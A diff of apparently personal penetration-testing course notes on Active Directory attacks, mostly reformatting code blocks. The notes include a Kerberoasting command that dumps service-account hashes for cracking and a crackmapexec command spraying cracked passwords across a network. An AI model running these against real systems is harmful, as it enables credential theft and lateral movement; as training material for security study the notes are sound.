@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-08-26-offsec-live-pen-200.h
 author: 100007
 ---
 
-# OffSec Live: PEN-200
-
-**author:** Nathan Acks  
-**date:** 2022-08-26
-
 # Active Directory Enumeration & Exploitation, Part 2
 
 `Get-DomainUsers -SPN` will list AD service accounts using `PowerView.ps1`.
@@ -23,8 +18,8 @@ There is an `Invoke-Kerberos.ps1` PowerShell module out there that does native k
 
 ```
 Invoke-Kerberoast -OutputFormat Hashcat |
-Select-Object Hash |
-Out-File -filepath "$FILE_PATH" -Width 8000
+	Select-Object Hash |
+	Out-File -filepath "$FILE_PATH" -Width 8000
 ```
 
 SSH port forwarding is actually using SOCKS5 under the hood. This is important to know when setting up tools like `proxychains`.
@@ -33,7 +28,7 @@ There’s a tool called `crackmapexec` that allows cracked passwords to be spray
 
 ```
 crackmapexec smb $TARGET_NETWORK/$TARGET_NETMASK \
--u $TARGER_USER -p $CRACKED_PASSWORD 2> /dev/null
+	-u $TARGER_USER -p $CRACKED_PASSWORD 2> /dev/null
 ```
 
 Microsoft Defender now detects ImPacket PSEXEC and SMBEXEC execution attempts.
